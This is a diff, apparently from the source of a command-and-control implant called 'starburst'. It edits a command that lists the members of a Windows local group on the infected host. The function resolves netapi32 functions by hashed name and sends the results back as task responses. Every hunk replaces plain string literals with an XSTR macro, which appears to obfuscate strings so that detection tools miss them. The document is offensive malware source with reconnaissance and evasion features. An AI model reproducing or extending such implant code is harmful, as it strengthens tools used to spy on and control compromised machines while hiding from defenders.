@@ -27,7 +27,7 @@ auto declfn starburst::cmd_net_localgroup_member(
     auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
+            XSTR( "LoadLibrary netapi32 failed" ) );
         return;
     }
 
@@ -39,7 +39,7 @@ auto declfn starburst::cmd_net_localgroup_member(
             expr::hash_string( "NetApiBufferFree" ) ) );
     if ( !pGetMembers || !pFree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
 
@@ -50,7 +50,7 @@ auto declfn starburst::cmd_net_localgroup_member(
 
     if ( !group_str || group_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "group name required" ) ) );
+            XSTR( "group name required" ) );
         return;
     }
 
@@ -78,7 +78,7 @@ auto declfn starburst::cmd_net_localgroup_member(
 
     if ( status != 0 && status != 234 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "NetLocalGroupGetMembers failed" ) ) );
+            XSTR( "NetLocalGroupGetMembers failed" ) );
         return;
     }
 
@@ -87,13 +87,13 @@ auto declfn starburst::cmd_net_localgroup_member(
     if ( !output ) {
         pFree( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t off = 0;
 
     // header
-    str_copy( output + off, symbol<char*>( const_cast<char*>( "Members of " ) ) );
+    str_copy( output + off, XSTR( "Members of " ) );
     off += 11;
     memory::copy( output + off, group_buf, group_len );
     off += group_len;
@@ -106,7 +106,7 @@ auto declfn starburst::cmd_net_localgroup_member(
         inst.kernel32.WideCharToMultiByte( CP_ACP, 0, members[i].lgrmi3_domainandname, -1, name, 260, nullptr, nullptr );
         uint32_t nlen = str_len( name );
 
-        str_copy( output + off, symbol<char*>( const_cast<char*>( "  " ) ) );
+        str_copy( output + off, XSTR( "  " ) );
         off += 2;
         memory::copy( output + off, name, nlen );
         off += nlen;
